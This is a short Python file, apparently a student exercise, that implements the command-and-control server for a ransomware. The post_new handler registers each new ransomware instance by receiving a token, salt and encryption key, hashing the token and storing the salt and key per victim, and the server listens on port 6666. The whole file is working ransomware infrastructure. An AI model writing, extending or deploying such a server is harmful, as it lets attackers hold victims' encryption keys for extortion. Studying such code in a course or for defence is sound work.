"""
    Anouar EL GAZRI 5A IoT
"""

import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance

        token = base64.b64decode(body["token"]) # we retrieved "token", "salt" and "key"
        salt = base64.b64decode(body["salt"])
        key = base64.b64decode(body["key"])

        # creating directory for token hash-SHA256
        hashed_token = sha256(token).hexdigest()
        #directory = os.path.join(path, hashed_token)
        directory = os.path.join(CNC.ROOT_PATH, hashed_token)
        os.makedirs(directory,exist_ok=True) # verifying that the directory does not exist

        # seperating the salt and the key in 2 files
        with open(os.path.join(directory, "salt.bin"), "wb") as salt_file:
            salt_file.write(salt)

        with open(os.path.join(directory, "key.bin"), "wb") as key_file:
            key_file.write(key)

        return {"status":"Success", "message": f"DATA SAVED for the token : {hashed_token}"}
           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()